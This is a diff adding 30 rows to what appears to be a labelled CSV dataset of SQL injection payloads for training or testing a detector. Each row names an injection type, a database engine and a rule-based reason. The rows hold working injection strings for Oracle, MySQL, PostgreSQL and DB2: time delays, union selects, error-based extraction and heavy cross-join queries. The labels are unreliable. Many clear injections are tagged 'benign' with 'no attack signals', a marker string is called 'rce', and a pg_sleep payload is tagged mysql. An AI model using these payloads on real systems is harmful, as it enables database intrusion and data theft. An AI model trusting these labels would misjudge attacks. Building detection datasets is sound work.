@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+4380,"1', ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4250 = 4250 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
+4381,"1' where 7125 = 7125 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4382,"1' ) as noqp where 4042 = 4042 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
+4383,-9217 or 9323 = 9323#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4384,1 ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 9932 = 9932,1,,boolean_blind,postgresql,0.95,) and ( detected — boolean_blind injection (priority 8) on postgresql,rule-based
+4385,"1' union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4386,"1%"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4387,1' ) as fxid where 5926 = 5926,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4388,1%' rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and '%' = ',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4389,1'|| ( select 'ezse' from dual where 3821 = 3821,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4390,"1' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'snad' like 'snad",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
+4391,( select ( case when ( 3592 = 3592 ) then 3592 else 3592* ( select 3592 from information_schema.character_sets ) end ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4392,1' ) ) ) order by 1--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4393,"-3719"" union all select 6609,6609,6609,6609#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4394,"1"" ) ) as cduw where 4495 = 4495",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4395,1' ) ) as gchn where 5856 = 5856,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4396,-2781 ) ) ) or 2573 = 5848--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4397,"1%"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""%"" = """,1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+4398,"-5548' where 4477 = 4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4399,select pg_sleep ( 5 ) ) ||',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+4400,1 ) ) and 3228 = 7376#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4401,"1 ) where 9645 = 9645 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4402,1 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4403,"1' ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'tfnb' = 'tfnb",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
+4404,"select * from generate_series ( 5846,5846,case when ( 5846 = 5227 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
+4405,1' ) rlike sleep ( 5 ) and ( 'boto' = 'boto,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+4406,"-6656"" ) union all select 3931#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+4407,"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""uosc"" = ""uosc",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
+4408,1 ) ) as zoso where 3633 = 3633,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+4409,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
